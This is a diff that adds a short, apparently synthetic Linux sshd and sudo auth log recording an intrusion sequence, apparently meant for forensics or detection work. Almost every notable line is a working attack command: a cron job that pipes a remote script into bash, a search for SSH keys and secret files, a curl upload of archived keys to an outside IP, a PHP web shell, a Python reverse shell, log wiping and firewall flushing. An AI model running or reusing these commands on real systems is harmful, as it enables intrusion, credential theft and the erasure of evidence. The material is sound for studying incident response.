@@ -1,0 +1,35 @@
+2024-11-22 06:15:01 sshd[3001]: Accepted password for sysadmin from 10.0.0.5 port 22
+2024-11-22 06:15:04 sshd[3001]: pam_unix(sshd:session): session opened for user sysadmin
+2024-11-22 06:15:22 sudo[3002]: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/crontab -e
+2024-11-22 06:16:01 sudo[3003]: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/bin/bash -c "echo '*/5 * * * * curl http://185.220.101.47/beacon.sh | bash' >> /var/spool/cron/root"
+2024-11-22 06:16:30 sshd[3004]: Received disconnect from 10.0.0.5 port 22
+2024-11-22 07:58:01 sshd[3010]: Accepted password for jdoe from 10.0.0.12 port 22
+2024-11-22 07:58:05 sshd[3010]: pam_unix(sshd:session): session opened for user jdoe
+2024-11-22 08:00:11 sshd[3011]: Accepted password for mrodriguez from 10.0.0.14 port 22
+2024-11-22 08:00:15 sshd[3011]: pam_unix(sshd:session): session opened for user mrodriguez
+2024-11-22 08:30:01 sudo[3012]: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/find / -name "*.pem" -o -name "*.key" -o -name "id_rsa"
+2024-11-22 08:30:45 sudo[3013]: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/usr/bin/find / -name "*.env" -o -name "config.yml" -o -name "secrets.yml"
+2024-11-22 08:31:02 sudo[3014]: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/tar czf /tmp/keys.tar.gz /home/jdoe/.ssh/ /root/.ssh/
+2024-11-22 08:31:44 sudo[3015]: jdoe : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -F "file=@/tmp/keys.tar.gz" http://185.220.101.47/upload
+2024-11-22 09:00:01 sshd[3020]: Failed password for root from 198.51.100.23 port 4444
+2024-11-22 09:00:03 sshd[3020]: Failed password for root from 198.51.100.23 port 4443
+2024-11-22 09:00:05 sshd[3020]: Failed password for root from 198.51.100.23 port 4442
+2024-11-22 09:00:07 sshd[3020]: Failed password for root from 198.51.100.23 port 4441
+2024-11-22 09:00:09 sshd[3020]: Failed password for root from 198.51.100.23 port 4440
+2024-11-22 09:15:33 sudo[3021]: mrodriguez : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash -c "echo '<?php system($_GET[cmd]); ?>' > /var/www/html/images/thumb.php"
+2024-11-22 09:16:01 sudo[3022]: mrodriguez : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod 755 /var/www/html/images/thumb.php
+2024-11-22 10:00:22 sshd[3030]: Accepted password for backup_svc from 10.0.2.15 port 22
+2024-11-22 10:00:25 sshd[3030]: pam_unix(sshd:session): session opened for user backup_svc
+2024-11-22 10:01:02 sudo[3031]: backup_svc : TTY=pts/2 ; PWD=/home/backup_svc ; USER=root ; COMMAND=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('185.220.101.47',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+2024-11-22 10:30:01 sudo[3040]: jdoe : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/bash -c "for f in /var/log/auth.log* /var/log/syslog* ; do > $f; done"
+2024-11-22 10:30:15 sudo[3041]: jdoe : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/journalctl --rotate
+2024-11-22 10:30:22 sudo[3042]: jdoe : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/journalctl --vacuum-time=1s
+2024-11-22 11:00:01 sshd[3050]: Accepted password for jdoe from 10.0.0.12 port 22
+2024-11-22 11:00:04 sshd[3050]: pam_unix(sshd:session): session opened for user jdoe
+2024-11-22 11:00:45 sudo[3051]: jdoe : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -F
+2024-11-22 11:00:47 sudo[3052]: jdoe : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -X
+2024-11-22 11:01:02 sudo[3053]: jdoe : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -P INPUT ACCEPT
+2024-11-22 11:01:04 sudo[3054]: jdoe : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -P FORWARD ACCEPT
+2024-11-22 11:01:06 sudo[3055]: jdoe : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/iptables -P OUTPUT ACCEPT
+2024-11-22 17:00:11 sshd[3060]: Received disconnect from 10.0.0.12 port 22
+2024-11-22 17:15:33 sshd[3061]: Received disconnect from 10.0.0.14 port 22
